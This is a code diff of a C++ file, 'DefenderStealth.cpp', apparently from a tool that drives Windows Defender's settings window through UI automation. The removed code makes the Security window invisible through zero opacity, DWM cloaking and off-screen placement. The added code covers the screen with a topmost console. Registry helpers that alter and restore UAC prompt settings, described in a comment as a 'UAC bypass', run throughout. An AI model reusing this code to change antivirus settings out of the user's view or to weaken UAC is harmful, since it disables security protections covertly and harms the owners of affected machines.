@@ -1,90 +1,59 @@
 // DefenderStealth.cpp
-// Ghost mode implementation: opacity manipulation, DWM cloaking, off-screen positioning, UAC bypass
+// Console window management and UAC bypass for Windows Defender automation
 
 #include "DefenderStealth.h"
-#include <thread>
-#include <chrono>
 #include <iostream>
 
-using namespace std::chrono_literals;
+#define DEBUG_LOGGING_ENABLED 0
 
-// Simple logging macros - cannot use common.h due to UIAutomation conflicts
-#define INFO_LOG(msg) std::wcout << L"[*] " << msg << L"\n"
-#define ERROR_LOG(msg) std::wcout << L"[-] " << msg << L"\n"
-#define DEBUG_LOG(msg) // Disabled by default
+#if DEBUG_LOGGING_ENABLED
+    #define DEBUG_LOG(msg) std::wcout << msg << L"\n"
+#else
+    #define DEBUG_LOG(msg) ((void)0)
+#endif
 
-struct FindWindowData {
-    HWND hWndFound;
-};
+static HWND g_hConsole = NULL;
+static WINDOWPLACEMENT g_originalPlacement = { sizeof(WINDOWPLACEMENT) };
+static bool g_isTopmost = false;
 
-// EnumWindows callback: finds and cloaks the window immediately
-BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
-    FindWindowData* data = (FindWindowData*)lParam;
-    wchar_t className[256] = { 0 };
+// ============================================================================
+// Console Window Management - TOPMOST Approach
+// ============================================================================
 
-    if (GetClassNameW(hwnd, className, 256)) {
-        if (wcscmp(className, L"ApplicationFrameWindow") == 0) {
-            if (IsWindowVisible(hwnd)) {
-
-                // GHOST MODE: triple-layer invisibility
-                
-                // Layer 1: opacity hack - set alpha to 0
-                LONG_PTR exStyle = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
-                if (!(exStyle & WS_EX_LAYERED)) {
-                    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED);
-                }
-                SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
-
-                // Layer 2: DWM cloak - hides from window manager/taskbar
-                int cloakValue = 1;
-                DwmSetWindowAttribute(hwnd, DWMWA_CLOAK, &cloakValue, sizeof(cloakValue));
-
-                // Layer 3: logical teleport - hijack restore position
-                WINDOWPLACEMENT wp = { sizeof(WINDOWPLACEMENT) };
-                if (GetWindowPlacement(hwnd, &wp)) {
-                    wp.flags = WPF_ASYNCWINDOWPLACEMENT;
-                    wp.showCmd = SW_SHOWNOACTIVATE;
-                    wp.rcNormalPosition.left = -4000;
-                    wp.rcNormalPosition.top = -4000;
-                    wp.rcNormalPosition.right = -3200;
-                    wp.rcNormalPosition.bottom = -3400;
-                    SetWindowPlacement(hwnd, &wp);
-                }
-
-                // Layer 4: physical teleport - move off-screen immediately
-                SetWindowPos(hwnd, NULL, -4000, -4000, 0, 0, 
-                             SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE | SWP_NOREDRAW);
-
-                // Keep window active for automation but completely hidden
-                ShowWindow(hwnd, SW_SHOWNOACTIVATE);
-
-                DEBUG_LOG(L"Window found and cloaked successfully");
-
-                data->hWndFound = hwnd;
-                return FALSE;
-            }
-        }
+bool DefenderStealth::SetConsoleTopmost() {
+    g_hConsole = GetConsoleWindow();
+    if (!g_hConsole) return false;
+    
+    // Save original state only on first call
+    if (!g_isTopmost) {
+        GetWindowPlacement(g_hConsole, &g_originalPlacement);
+        g_isTopmost = true;
     }
-    return TRUE;
+    
+    // Maximize and set TOPMOST to cover everything
+    ShowWindow(g_hConsole, SW_SHOWMAXIMIZED);
+    SetWindowPos(g_hConsole, HWND_TOPMOST, 0, 0, 0, 0, 
+                 SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+    
+    return true;
 }
 
-// EnumWindows callback: find only (no cloaking) for pre-warm
-BOOL CALLBACK EnumWindowsProcFindOnly(HWND hwnd, LPARAM lParam) {
-    FindWindowData* data = (FindWindowData*)lParam;
-    wchar_t className[256] = { 0 };
-
-    if (GetClassNameW(hwnd, className, 256)) {
-        if (wcscmp(className, L"ApplicationFrameWindow") == 0) {
-            if (IsWindowVisible(hwnd)) {
-                data->hWndFound = hwnd;
-                return FALSE;
-            }
-        }
-    }
-    return TRUE;
+bool DefenderStealth::RestoreConsoleNormal() {
+    if (!g_hConsole || !g_isTopmost) return false;
+    
+    // Remove TOPMOST and restore original window state
+    SetWindowPos(g_hConsole, HWND_NOTOPMOST, 0, 0, 0, 0, 
+                 SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+    SetWindowPlacement(g_hConsole, &g_originalPlacement);
+    
+    g_isTopmost = false;
+    return true;
 }
 
-// Registry helpers
+// ============================================================================
+// Registry Helpers
+// ============================================================================
+
 bool DefenderStealth::ReadRegistryDword(const wchar_t* valueName, DWORD& outValue, bool& existed) {
     HKEY hKey;
     LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, UAC_REGISTRY_PATH, 0, KEY_READ, &hKey);
@@ -125,7 +94,10 @@ bool DefenderStealth::DeleteRegistryValue(const wchar_t* valueName) {
     return (result == ERROR_SUCCESS);
 }
 
-// UAC encoding/decoding
+// ============================================================================
+// UAC Logic
+// ============================================================================
+
 DWORD DefenderStealth::EncodeUACStatus(DWORD cpba, bool cpbaExisted, DWORD posd, bool posdExisted) {
     DWORD encoded = 0;
     encoded |= (cpbaExisted ? (cpba & 0xFF) : KEY_NOT_EXISTED);
@@ -189,65 +161,21 @@ bool DefenderStealth::RecoverUACIfNeeded() {
     DWORD encoded = 0;
     bool backupExisted = false;
     if (ReadRegistryDword(UAC_BACKUP_KEY, encoded, backupExisted) && backupExisted) {
-        INFO_LOG(L"Found incomplete UAC backup, restoring");
+        std::wcout << L"[*] Found incomplete UAC backup, restoring\n";
         return RestoreUAC();
     }
     return true;
 }
 
-// Window finder with ghost mode cloaking
-HWND DefenderStealth::FindAndCloakSecurityWindow(int maxRetries) {
-    FindWindowData data = { 0 };
+// ============================================================================
+// Volatile Registry Marker (Session Persistence)
+// ============================================================================
 
-    for (int i = 0; i < maxRetries; ++i) {
-        EnumWindows(EnumWindowsProc, (LPARAM)&data);
-
-        if (data.hWndFound) {
-            HWND hwnd = data.hWndFound;
-
-            // Double-tap insurance: re-apply opacity and position
-            LONG_PTR exStyle = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
-            if (!(exStyle & WS_EX_LAYERED)) {
-                SetWindowLongPtrW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED);
-                SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
-            }
-
-            SetWindowPos(hwnd, NULL, -4000, -4000, 0, 0, 
-                         SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE | SWP_SHOWWINDOW);
-            
-            return hwnd;
-        }
-
-        // Delay for slow hardware (battery saving mode/slow CPU)
-        std::this_thread::sleep_for(100ms);
-    }
-    return NULL;
-}
-
-HWND DefenderStealth::FindSecurityWindowOnly(int maxRetries) {
-    FindWindowData data = { 0 };
-
-    for (int i = 0; i < maxRetries; ++i) {
-        EnumWindows(EnumWindowsProcFindOnly, (LPARAM)&data);
-
-        if (data.hWndFound) {
-            return data.hWndFound;
-        }
-
-        std::this_thread::sleep_for(100ms);
-    }
-    return NULL;
-}
-
-// Volatile registry marker for session persistence
 bool DefenderStealth::CheckVolatileWarmMarker() {
     HKEY hKey;
-    // Open the specific subkey "WinDefCtl" which is created as volatile.
-    // We cannot use the parent "Software\\kvc" directly as it might be persistent.
     LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\kvc\\WinDefCtl", 0, KEY_READ, &hKey);
     
     if (result != ERROR_SUCCESS) {
-        // Key does not exist, which means this is a cold boot (or first run after reboot)
         return false;
     }
 
@@ -263,11 +191,10 @@ bool DefenderStealth::SetVolatileWarmMarker() {
     HKEY hKey;
     DWORD disposition;
     
-    // Create volatile key (disappears on logout/reboot)
-    // Targeting "Software\\kvc\\WinDefCtl" to ensure volatility works even if "kvc" exists permanently
+    // Volatile key disappears on logout/reboot
     LONG result = RegCreateKeyExW(
         HKEY_CURRENT_USER,
-        L"Software\\kvc\\WinDefCtl", 
+        L"Software\\kvc\\WinDefCtl",
         0,
         NULL,
         REG_OPTION_VOLATILE,
